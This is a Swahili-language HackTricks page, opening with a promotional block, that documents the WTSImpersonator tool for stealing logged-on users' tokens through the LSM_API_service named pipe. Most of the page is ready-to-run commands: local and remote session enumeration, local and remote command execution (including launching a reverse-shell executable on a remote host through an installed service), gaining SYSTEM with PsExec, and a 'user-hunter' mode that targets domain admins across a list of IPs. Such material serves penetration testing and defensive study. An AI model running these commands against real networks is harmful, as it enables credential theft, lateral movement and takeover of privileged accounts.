<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

**Zana ya WTS Impersonator** inatumia bomba la jina la RPC la **"\\pipe\LSM_API_service"** kwa siri kuchunguza watumiaji walioingia na kuiba vitambulisho vyao, kukiuka mbinu za kawaida za Udanganyifu wa Vitambulisho. Mbinu hii inarahisisha harakati za pembeni ndani ya mitandao. Ubunifu nyuma ya mbinu hii unatolewa kwa **Omri Baso, ambaye kazi yake inapatikana kwenye [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Kazi Kuu
Zana hufanya kazi kupitia mfululizo wa wito wa API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Moduli muhimu na Matumizi
- **Kutambua Watumiaji**: Uchambuzi wa watumiaji wa ndani na wa mbali unawezekana kwa kutumia zana, kwa kutumia amri kwa hali yoyote:
- Kwa ndani:
```powershell
.\WTSImpersonator.exe -m enum
```
- Kijijini, kwa kufafanua anwani ya IP au jina la mwenyeji:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Kutekeleza Amri**: Moduli za `exec` na `exec-remote` zinahitaji **Muktadha wa Huduma** ili kufanya kazi. Utekelezaji wa ndani unahitaji tu faili ya WTSImpersonator na amri:
- Mfano wa utekelezaji wa amri ya ndani:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe inaweza kutumika kupata muktadha wa huduma:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Utekelezaji wa Amri Kijijini**: Unahusisha kuunda na kusakinisha huduma kijijini sawa na PsExec.exe, kuruhusu utekelezaji na ruhusa sahihi.
- Mfano wa utekelezaji wa kijijini:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Moduli ya Kutafuta Mtumiaji**: Inalenga watumiaji maalum kwenye mashine kadhaa, kutekeleza nambari chini ya sifa zao. Hii ni muhimu hasa kwa kulenga Waadmin wa Kikoa wenye haki za msimamizi wa ndani kwenye mifumo kadhaa.
- Mfano wa matumizi:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
